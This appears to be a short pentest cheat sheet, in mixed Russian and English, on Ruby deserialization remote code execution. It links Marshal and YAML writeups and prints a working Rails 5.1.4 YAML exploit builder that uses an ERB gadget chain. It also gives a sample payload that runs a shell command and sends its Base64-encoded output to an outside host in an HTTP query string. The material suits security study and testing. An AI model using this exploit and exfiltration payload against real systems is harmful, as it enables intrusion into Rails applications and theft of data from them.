# Deserialisation



md на github о десере в Ruby: [https://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md](https://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md)

### Marshal.load(\<user\_input>) = RCE

Ruby Marshal+Base64 RCE payload playground/generator: [https://repl.it/@allyshka/Ruby-RCE-with-Marshalload](https://repl.it/@allyshka/Ruby-RCE-with-Marshalload)

Other guide: [https://www.elttam.com/blog/ruby-deserialization/](https://www.elttam.com/blog/ruby-deserialization/)

### YAML.load(\<user\_input>) = RCE

### Rails 5.1.4 YAML unsafe deserialization RCE payload

Example: [https://gist.github.com/niklasb/df9dba3097df536820888aeb4de3284f](https://gist.github.com/niklasb/df9dba3097df536820888aeb4de3284f)

Точно работает на Rails **5.1.4**

```ruby
require "erb"
require "base64"
require "active_support"
 
if ARGV.empty?
  puts "Usage: exploit_builder.rb <source_file>"
  exit!
end
 
erb = ERB.allocate
erb.instance_variable_set :@src, File.read(ARGV.first)
erb.instance_variable_set :@lineno, 1
 
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result
 
payload = Base64.encode64(Marshal.dump(depr))
 
puts <<-PAYLOAD
---
!ruby/object:Gem::Requirement
requirements:
  - !ruby/object:Rack::Session::Abstract::SessionHash
      req: !ruby/object:Rack::Request
        env:
          rack.session: !ruby/object:Rack::Session::Abstract::SessionHash
            loaded: true
          HTTP_COOKIE: "a=#{payload}"
      store: !ruby/object:Rack::Session::Cookie
        coder: !ruby/object:Rack::Session::Cookie::Base64::Marshal {}
        key: a
        secrets: []
      exists: true
PAYLOAD
```

Пример payload:

```ruby
require "base64"
out = `pwd`
url = URI.parse('http://bizone.pw')
req = Net::HTTP::Get.new(url.to_s + '/?q=' + Base64.strict_encode64(out))
res = Net::HTTP.start(url.host, url.port) {|http|
  http.request(req)
}
```
